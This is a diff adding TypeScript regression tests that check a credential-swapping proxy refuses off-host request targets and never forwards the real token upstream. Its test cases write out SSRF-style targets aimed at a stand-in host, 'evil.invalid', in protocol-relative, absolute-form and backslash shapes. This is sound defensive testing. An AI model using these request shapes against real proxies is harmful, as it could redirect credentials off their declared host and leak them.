@@ -439,3 +439,98 @@ test("W1-T2699 (4): a refusal row is shaped identically to an allow row — same
   const refuse = boundaryLedgerRow("undeclared", "refuse", "refused", "no destination is declared");
   assert.deepEqual(Object.keys(allow).sort(), Object.keys(refuse).sort());
 });
+
+// ── (5) THE REQUEST TARGET CANNOT REDIRECT THE REAL CREDENTIAL OFF THE DECLARED HOST ─────────────
+
+/*
+ * CodeQL flagged `new URL(req.url, base)` on the forwarding path as SSRF, and it is reachable by
+ * the exact actor this module exists to contain: a worker holds its sentinel by design, so it can
+ * always reach the proxy. `new URL(target, base)` is not a join — three shapes discard the base
+ * entirely, and the real credential is attached AFTER the resolve. Each case below asserts the
+ * upstream was never called, which is the property that matters: a 403 with the token already
+ * sent would still be an exfiltration. FALSIFIER: delete the origin check in startBoundaryProxy
+ * and every case reports upstreamCalled true.
+ */
+function offHostFixture() {
+  const rows: BoundaryLedgerRow[] = [];
+  const sentinel = mintSentinel("model");
+  let upstreamCalled = false;
+  const destinations: BoundaryDestination[] = [
+    { host: MODEL_HOST_DEFAULT, sentinel, upstreamBaseUrl: "https://upstream.invalid", realValue: () => "REAL-SUBSCRIPTION-TOKEN" },
+  ];
+  const fetchImpl = (async () => {
+    upstreamCalled = true;
+    return new Response("must never be reached", { status: 200 });
+  }) as unknown as typeof fetch;
+  return { rows, sentinel, destinations, fetchImpl, called: () => upstreamCalled };
+}
+
+/** Send a verbatim request target over a raw socket — `fetch` normalises the shapes this tests. */
+function rawRequest(port: number, target: string, sentinel: string): Promise<string> {
+  return new Promise((resolve, reject) => {
+    const sock = createConnection({ port, host: "127.0.0.1" }, () => {
+      sock.write(`GET ${target} HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Bearer ${sentinel}\r\nConnection: close\r\n\r\n`);
+    });
+    let seen = "";
+    sock.on("data", (c) => (seen += String(c)));
+    sock.on("error", reject);
+    sock.on("close", () => resolve(seen));
+  });
+}
+
+test("W1-T2699 (5): a protocol-relative request target is refused and the real credential is never sent upstream", async () => {
+  const fx = offHostFixture();
+  const proxy = await startBoundaryProxy({ destinations: fx.destinations, log: (r) => fx.rows.push(r), fetchImpl: fx.fetchImpl });
+  try {
+    const res = await fetch(`${proxy.url}//evil.invalid/x`, { headers: { authorization: `Bearer ${fx.sentinel}` } });
+    assert.equal(res.status, 403, "a target resolving to another origin must be refused");
+    assert.equal(fx.called(), false, "the upstream must never be called — the real token is attached after the resolve");
+    assert.ok(
+      fx.rows.some((r) => r.decision === "refuse" && /off the declared destination/.test(r.reason)),
+      "the refusal must ledger its own reason",
+    );
+  } finally {
+    await proxy.close();
+  }
+});
+
+test("W1-T2699 (5): an absolute-form request target is refused and the real credential is never sent upstream", async () => {
+  const fx = offHostFixture();
+  const proxy = await startBoundaryProxy({ destinations: fx.destinations, log: (r) => fx.rows.push(r), fetchImpl: fx.fetchImpl });
+  try {
+    const seen = await rawRequest(proxy.port, "http://evil.invalid/x", fx.sentinel);
+    assert.match(seen, /^HTTP\/1\.1 403/, "an absolute-form target naming another host must be refused");
+    assert.equal(fx.called(), false, "the upstream must never be called");
+  } finally {
+    await proxy.close();
+  }
+});
+
+test("W1-T2699 (5): a backslash request target is refused and the real credential is never sent upstream", async () => {
+  const fx = offHostFixture();
+  const proxy = await startBoundaryProxy({ destinations: fx.destinations, log: (r) => fx.rows.push(r), fetchImpl: fx.fetchImpl });
+  try {
+    const seen = await rawRequest(proxy.port, "/\\\\evil.invalid/x", fx.sentinel);
+    assert.match(seen, /^HTTP\/1\.1 403/, "a backslash target that WHATWG normalises to another host must be refused");
+    assert.equal(fx.called(), false, "the upstream must never be called");
+  } finally {
+    await proxy.close();
+  }
+});
+
+test("W1-T2699 (5): an ordinary path on the declared host still forwards, so the check is not a blanket refusal", async () => {
+  const fx = offHostFixture();
+  let sawUrl: string | undefined;
+  const fetchImpl = (async (url: unknown) => {
+    sawUrl = String(url);
+    return new Response("ok", { status: 200 });
+  }) as unknown as typeof fetch;
+  const proxy = await startBoundaryProxy({ destinations: fx.destinations, log: (r) => fx.rows.push(r), fetchImpl });
+  try {
+    const res = await fetch(`${proxy.url}/v1/messages?beta=true`, { headers: { authorization: `Bearer ${fx.sentinel}` } });
+    assert.equal(res.status, 200, "the declared destination must still be reachable");
+    assert.equal(sawUrl, "https://upstream.invalid/v1/messages?beta=true", "path and query must survive the check");
+  } finally {
+    await proxy.close();
+  }
+});
